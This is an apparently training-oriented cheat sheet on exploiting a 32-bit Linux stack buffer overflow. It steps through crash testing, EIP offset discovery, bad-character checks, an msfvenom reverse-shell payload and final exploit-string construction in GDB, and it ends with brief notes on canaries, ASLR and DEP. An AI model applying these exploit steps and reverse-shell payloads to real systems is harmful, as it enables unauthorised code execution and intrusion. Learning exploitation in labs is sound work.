# Buffer Overflow

{% hint style="info" %}
Buffer overflow is an **anomaly** that occurs when **software writing data to a buffer overflows the buffer’s capacity**, resulting in **adjacent memory locations being overwritten**.

_In other words, too much information is being passed into a container that does not have enough space, and that information ends up replacing data in adjacent containers._

Buffer overflows can be exploited by attackers with a goal of modifying a computer’s memory in order to undermine or take control of program execution.
{% endhint %}

![BOF](<../.gitbook/assets/image (63).png>)

### Check file type

```bash
file bow32 | tr "," "\n"
```

***

### How to attack ?

![](<../.gitbook/assets/image (39).png>)

#### 1 : Testing the Crash

![](<../.gitbook/assets/image (114).png>)

```bash
#Python command to BOF
run $(python -c "print '\x55' * 1200")

#To confirm the exact number of Bytes needed 
info registers eip
```

#### 2 : Finding the EIP Offset

![](<../.gitbook/assets/image (13).png>)

```bash
# Generate a more precise pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt

# Run the pattern using python
run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

# Locate the exact memory address where the BOF occurs
info registers eip

# Use the memory address to calculate the offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
```

![](<../.gitbook/assets/image (146).png>)

#### 3 : Finding Shellcode Space : General

```bash
# Calculate the required padding for the payload
run $(python -c "print '\x55' * 1036 + '\x66' * 4")
```

#### 4 : First Stage Payload

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```

#### 5 : Finding Shellcode Space : Garbage + NOPs + Payload + EIP

![](<../.gitbook/assets/image (2) (1).png>)

```bash
    # Pre-final padding (Garbage - NOPs - Payload - EIP)
    Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
    NOPs = "\x90" * 100
    Shellcode = "\x44" * 150
    EIP = "\x66" * 4'
```

```bash
# Pre-final BOF Exploit
# Must check for Bad Chars before executing
run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
```

![](<../.gitbook/assets/image (116).png>)

#### 6 : Testing for Bad Chars

⚠️ **FACULTATIVE**, BUT... MUST CHECK WHEN USING **ONLINE SHELLCODES** ⚠️

```bash
    # Most Bad Chars
    \x00 - Null Byte
    \x0A - Line Feed
    \x0D - Carriage Return
    \xFF - Form Feed
    \x09
    \x20
```

### How to find bad Chars

```bash
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

```bash
    ## Padding to check Bad Chars
    Buffer = "\x55" * (1040 - 256 - 4) = 780
    CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
    EIP = "\x66" * 4
```

```bash
# Prep for testing Bad Chars
disas main
break bowfunc 
```

```bash
# Run Python script
run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```

```bash
# Check for memory in break for \x00 (Must follow the $CHAR pattern)
x/2000xb $esp+500
# Check image below
```

![](<../.gitbook/assets/image (18).png>)

#### 1 : Final Stage Payload

```bash
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
```

#### 2 : Finding JMP EIP

```bash
   # Enter the payload
   # Next focus on the placement of EIP (return address)
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
   NOPs = "\x90" * 124
   Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
   EIP = "\x66" * 4'
```

```bash
# Python command to locate EIP
run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
```

![](<../.gitbook/assets/image (9).png>)

⚡ **Choose an address to which we refer the EIP and which reads and executes one byte after the other starting at this address.**

![](<../.gitbook/assets/image (40).png>)

#### 🚨 **Execute the Payload | Rain Hell on 'em** 🚨

```bash
   # 🚨 NOTE!! Payload must be run outside GDB, Duhh!! 🚨
   # Final Padding
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 841
   NOPs = "\x90" * 124
   Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
   EIP = "\x4c\xd6\xff\xff"
```

### GDB Syntax

```bash
set disassembly-flavor intel

disassemble main

disas bowfunc

info registers 

info registers eip
i r $eip
```

![](<../.gitbook/assets/image (36).png>)

![](<../.gitbook/assets/image (81).png>)

![](<../.gitbook/assets/image (74).png>)

### How to protect ?

* **Canaries** The canaries are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.
* **Address Space Layout Randomization (ASLR)** Address Space Layout Randomization (ASLR) is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.
* **Data Execution Prevention (DEP)** DEP is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.
